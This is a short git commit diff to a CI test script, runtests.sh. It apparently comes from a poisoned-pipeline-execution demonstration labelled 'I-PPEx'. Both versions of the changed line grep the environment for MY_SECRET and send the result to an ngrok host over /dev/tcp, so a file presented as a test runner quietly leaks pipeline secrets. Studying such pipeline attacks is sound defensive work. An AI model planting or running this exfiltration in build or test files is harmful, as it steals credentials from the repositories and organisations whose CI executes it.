374a6f4bc2dc469055564a3d642ce8da0ec87606
lmgv66 <51816696+lmgv66@users.noreply.github.com>
2023-12-04 09:53:33 +0100

    Update runtests.sh

--- runtests.sh
+++ runtests.sh
@@ -1,6 +1,6 @@
 echo "Executing Tests script [from user $1 at $2]" >> runtests.out
 
-echo ------- I-PPEx From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/0.tcp.eu.ngrok.io/16174
+echo ------- I-PPEx From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/0.tcp.eu.ngrok.io/11370
 
 RET=0
 #exit $RET
